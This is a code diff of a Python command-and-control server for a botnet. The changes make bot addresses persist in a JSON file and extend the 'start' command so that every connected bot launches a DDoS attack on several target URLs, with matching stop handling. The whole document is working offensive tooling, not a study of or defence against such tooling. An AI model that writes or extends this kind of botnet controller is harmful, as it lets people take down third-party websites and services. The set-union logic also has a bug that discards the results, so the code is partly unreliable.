@@ -7,8 +7,6 @@ import threading
 from termcolor import colored, cprint
 
 
-# TODO save online bots IPs on a file on closing and add them to cnc on startup
-
 class CnC:
     """
     Command & Control center of the botnet.
@@ -16,7 +14,10 @@ class CnC:
 
     def __init__(self, host: str, port: int):
         self.__address = (host, port)
-        self.__bots = {}
+
+        with open("bots.json", "r") as f:
+            self.__bots = json.load(f)
+
         self.__cmds = {
             'help': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': False},
             'bots': {'fun': self.__list_clients, 'desc': self.__list_clients.__doc__, 'args': False},
@@ -25,7 +26,7 @@ class CnC:
             'start': {'fun': self.__start, 'desc': self.__start.__doc__, 'args': True},
             'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': False},
             'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': False}
-        }
+        }  # TODO email batch
         self.__lock = threading.Lock()  # lock for thread-safe access to attributes
 
         self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -95,7 +96,7 @@ class CnC:
                 res += f"System info of bot {address}:\n"
 
                 if address not in self.__bots.keys():
-                    res += colored("This address does not belong to any connected bot.\n", 'red')
+                    res += colored("This address does not belong to any connected bot.\n\n", 'red')
                     continue
 
                 try:
@@ -124,7 +125,7 @@ class CnC:
                 res += f"Status of bot {address}:\n"
 
                 if address not in self.__bots.keys():
-                    res += colored("This address does not belong to any connected bot.\n", 'red')
+                    res += colored("This address does not belong to any connected bot.\n\n", 'red')
                     continue
 
                 try:
@@ -138,19 +139,19 @@ class CnC:
                 res += "\n"
             return res
 
-    def __start(self, urls):  # TODO get url from file
-        # TODO implement more than one argument
+    def __start(self, urls):
         """
         Start a DDoS attack to the given  urls.
         """
-        url = urls[0]
         with self.__lock:
             if len(self.__bots) == 0:
                 return colored("No bot connected.", 'red')
-            responses = {
-                requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
-                for address, port in self.__bots.items()
-            }
+            responses = set()
+            for url in urls:
+                responses.union({
+                    requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
+                    for address, port in self.__bots.items()
+                })
             if len(responses) == 1 and responses.pop() != 200:
                 return colored("Attack did not start...", "red")
         return colored("Attack started successfully!", "green")
@@ -166,14 +167,21 @@ class CnC:
                 requests.get(f"http://{address}:{port}/stop").status_code
                 for address, port in self.__bots.items()
             }
-            if len(responses) == 1 and responses.pop() != 200:
+            if len(responses) != 1:
                 return colored("Attack did not stop...", "red")
-        return colored("Attack stopped successfully!", "green")
+            code = responses.pop()
+            if code == 406:
+                return colored("There isn't any attack running", "yellow")
+            return colored("Attack stopped successfully!", "green")
 
     def __exit(self) -> str:
         """
         Close the botnet.
         """
+        with self.__lock:
+            bots = json.dumps(self.__bots, indent=4)
+            with open("bots.json", "w") as f:
+                f.write(bots)
         return colored("Closing program...", "red")
 
     def cli(self):
